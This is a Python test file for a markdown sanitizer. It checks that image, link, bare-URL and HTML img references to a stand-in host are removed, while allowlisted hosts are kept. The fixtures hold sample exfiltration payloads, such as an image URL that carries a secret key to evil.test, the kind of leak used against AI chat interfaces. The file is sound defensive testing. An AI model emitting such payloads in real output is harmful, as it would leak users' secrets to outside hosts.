from tessera.sanitize import sanitize_markdown


def test_markdown_image_exfil_is_stripped():
    text = "Here is data ![pixel](https://evil.test/p?leak=sk-SECRET)"
    r = sanitize_markdown(text)
    assert "evil.test" not in r.text
    assert "sk-SECRET" not in r.text
    assert "image removed" in r.text
    assert "https://evil.test/p?leak=sk-SECRET" in r.removed
    assert r.changed


def test_allowlisted_host_survives():
    text = "![logo](https://cdn.trusted.test/logo.png)"
    r = sanitize_markdown(text, allowlist={"trusted.test"})
    assert "cdn.trusted.test/logo.png" in r.text
    assert not r.changed


def test_subdomain_of_allowlisted_host_survives():
    text = "![x](https://a.b.trusted.test/i.png)"
    r = sanitize_markdown(text, allowlist={"trusted.test"})
    assert "a.b.trusted.test" in r.text


def test_link_url_removed_but_text_kept():
    text = "see [the report](https://evil.test/leak?d=SECRET)"
    r = sanitize_markdown(text)
    assert "the report" in r.text
    assert "evil.test" not in r.text


def test_bare_url_defanged():
    text = "visit https://evil.test/leak?d=SECRET now"
    r = sanitize_markdown(text)
    assert "evil.test" not in r.text
    assert "url removed" in r.text


def test_html_img_tag_stripped():
    text = '<img src="https://evil.test/p?d=SECRET">'
    r = sanitize_markdown(text)
    assert "evil.test" not in r.text


def test_clean_text_unchanged():
    text = "Just some ordinary text with no urls."
    r = sanitize_markdown(text)
    assert r.text == text
    assert not r.changed
